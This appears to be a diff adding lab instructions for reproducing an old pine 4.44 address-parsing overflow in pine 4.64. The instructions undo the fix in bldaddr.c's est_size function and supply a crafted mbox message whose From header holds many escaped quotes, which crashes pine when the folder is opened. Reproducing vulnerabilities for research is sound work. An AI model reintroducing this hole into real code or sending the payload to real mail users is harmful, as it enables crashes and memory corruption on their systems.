@@ -1,0 +1,67 @@
+1) To get and build pine4.64:
+
+   Get pine4.64 via an RPM file
+   Get source as pine4.64.tar
+   tar xvf pine4.64.tar 
+   cd pine4.64
+   ./buildcyg cyg
+   cd bin
+   ./pine.exe
+
+2) To put the pine4.44 vulnerability back into pine4.64
+
+   cd pine4.64
+   cd pine
+   em bldaddr.c
+     Go to est_size function
+     Change the line
+       cnt   += 2 * (a->mailbox  ? (strlen(a->mailbox)+1)    : 0);
+     to
+       cnt   += (a->mailbox  ? (strlen(a->mailbox)+1)    : 0);
+
+3) Rebuild pine
+
+   cd pine4.64
+   ./buildcyg cyg
+
+4) To trigger the vulnerability
+
+   Put the following file into ~/mail/PineExploit
+
+From #rinard  Sat Dec 16 14:34:49 2006
+From: "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\""@foo.com
+To: leut@localhost.localdomain
+Subject: Exploit for pine 4.44
+X-IMAPbase: 1166405542 2
+Status: RO
+X-Status: 
+X-Keywords:                      
+X-UID: 1
+
+This is an exploit!!  When this message is received, pine crashes and
+won't start again until this message is manually removed.
+
+From #rinard  Sat Dec 16 14:34:49 2006
+From: "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\""@foo.com
+To: leut@localhost.localdomain
+Subject: Exploit for pine 4.44
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 2
+
+This is an exploit!!  When this message is received, pine crashes and
+won't start again until this message is manually removed.
+
+   cd pine4.64
+   cd bin
+   ./pine.exe
+     hit return to list folders
+     select PineExploit folder
+     hit return to see headers of messages in this folder
+     pine crashes
+
+  cd pine4.64
+  cd bin
+  ./pine.exe -i -f ~/mail/PineExploit
+    pine crashes
